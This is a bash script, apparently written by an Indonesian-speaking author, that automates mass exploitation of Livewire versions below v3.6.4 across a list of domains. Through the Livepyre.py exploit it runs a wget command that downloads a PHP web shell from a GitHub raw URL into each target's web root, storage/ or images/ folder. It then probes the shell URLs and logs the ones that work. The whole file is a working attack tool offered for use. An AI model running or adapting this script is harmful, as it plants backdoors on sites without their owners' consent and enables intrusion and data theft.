#!/bin/bash
# scan_log_domain_path.sh

LOG_FILE="shell_uploads_$(date +%Y%m%d_%H%M%S).txt"
SUCCESS_FILE="successful_shells.txt"
FAILED_FILE="failed_attempts.txt"

echo "Livewire Auto Shell Upload Scanner"
echo "=================================="
echo "Shell: configtester.php"
echo ""

total=0
success=0

while IFS= read -r domain_raw; do
    [[ -z "$domain_raw" ]] && continue
    ((total++))
    
    # Bersihkan domain
    domain=$(echo "$domain_raw" | tr -d '\r' | xargs)
    
    # Tambahkan https:// jika belum ada
    if [[ ! "$domain" =~ ^https?:// ]]; then
        domain="https://$domain"
    fi
    
    echo "[$total] $domain"
    
    # Wget command - upload ke 3 tempat relatif
    # 1. Dir saat ini 2. storage/ 3. images/
    cmd="wget -O configtester.php https://raw.githubusercontent.com/Bayyzp/ntah/main/tehabfus.php 2>/dev/null || wget -O storage/configtester.php https://raw.githubusercontent.com/Bayyzp/ntah/main/tehabfus.php 2>/dev/null || wget -O images/configtester.php https://raw.githubusercontent.com/Bayyzp/ntah/main/tehabfus.php 2>/dev/null"
    
    output=$(timeout 90 ./Livepyre.py -u "$domain" -f "system" -p "$cmd" 2>&1)
    
    # Log ke file
    echo "=== $(date) ===" >> "$LOG_FILE"
    echo "DOMAIN: $domain" >> "$LOG_FILE"
    echo "COMMAND: $cmd" >> "$LOG_FILE"
    echo "OUTPUT:" >> "$LOG_FILE"
    echo "$output" >> "$LOG_FILE"
    
    # Analisis hasil
    if echo "$output" | grep -q "The remove livewire version is"; then
        version=$(echo "$output" | grep -o "v[0-9]\.[0-9]\.[0-9]" | head -1)
        
        if [[ "$version" < "v3.6.4" ]]; then
            if echo "$output" | grep -q "Payload works"; then
                ((success++))
                echo "  ✅ VULN + Shell uploaded ($version)"
                
                # Cek URL shell di 3 lokasi
                urls=(
                    "$domain/configtester.php"
                    "$domain/storage/configtester.php"
                    "$domain/images/configtester.php"
                )
                
                accessible=0
                for url in "${urls[@]}"; do
                    verify=$(timeout 30 curl -s -f -I "$url" 2>/dev/null | head -1)
                    if [[ "$verify" == *"200"* ]]; then
                        echo "  🔗 Shell accessible: $url"
                        echo "$url" >> "$SUCCESS_FILE"
                        accessible=1
                        break
                    fi
                done
                
                if [[ $accessible -eq 0 ]]; then
                    echo "  ⚠️  Shell uploaded but not accessible"
                    # Coba lagi dengan curl content (bukan header saja)
                    for url in "${urls[@]}"; do
                        content=$(timeout 30 curl -s -f "$url" 2>/dev/null)
                        if [[ -n "$content" ]] && [[ "$content" != *"404"* ]] && [[ "$content" != *"Not Found"* ]]; then
                            echo "  🔍 Shell mungkin accessible (content ditemukan): $url"
                            echo "$url" >> "$SUCCESS_FILE"
                            accessible=1
                            break
                        fi
                    done
                fi
                
                echo "$domain | $version | configtester.php" >> "vuln_with_shell.txt"
                
            else
                echo "  ❌ VULN but upload failed ($version)"
                echo "$domain | $version | FAILED" >> "$FAILED_FILE"
            fi
        else
            echo "  🔵 Patched ($version)"
        fi
    else
        echo "  ❌ Not vulnerable"
    fi
    
    echo ""
    sleep 2
    
done < <(cat domains.txt | sed '/^$/d' | sed '/^#/d')

echo "=================================="
echo "SCAN SUMMARY"
echo "Total tested: $total"
echo "Successful uploads: $success"
echo ""
echo "Files created:"
echo "1. $LOG_FILE - Full logs"
echo "2. $SUCCESS_FILE - List of shell URLs"
echo "3. vuln_with_shell.txt - Detailed info"
echo "4. $FAILED_FILE - Failed attempts"